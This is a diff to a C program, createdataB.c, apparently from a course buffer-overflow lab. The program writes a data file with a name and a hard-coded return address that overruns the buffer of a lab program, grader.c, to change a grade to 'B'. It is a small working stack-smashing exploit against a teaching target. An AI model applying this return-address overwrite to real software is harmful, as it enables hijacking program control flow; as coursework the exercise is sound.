@@ -1,9 +1,17 @@
+/*--------------------------------------------------------------------*/
+/* createdataB.c                                                      */
+/* Authors: Jacob Santelli and Joshua Yang                            */
+/*--------------------------------------------------------------------*/
+
 #include <stdio.h>
 
+/* Main takes no input; writes output to data, a binary file that 
+   overruns the buffer of grader.c and gives "Jacob" a grade of 'B'.
+   Returns data. */
 int main(void) {
     /* file to write to */
     FILE *psFile;
-    /* contains address to break to */
+    /* address to break to */
     unsigned long ulAddress;
     /* our names (truncated) */
     char* name = "Jacob";
@@ -15,7 +23,6 @@ int main(void) {
     /* write name to file */
     for (i = 0; i < 5; i++) {
         char n = *name;
-        /* fwrite(&n, sizeof(char), 1, psFile); */
         fprintf(psFile, "%c", n);
         name++;
     }
@@ -30,7 +37,7 @@ int main(void) {
    
     /* write address of grade = 'B' */
     ulAddress = 0x400858;
-    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
+    (void) fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
 
     fclose(psFile);
     return 0;
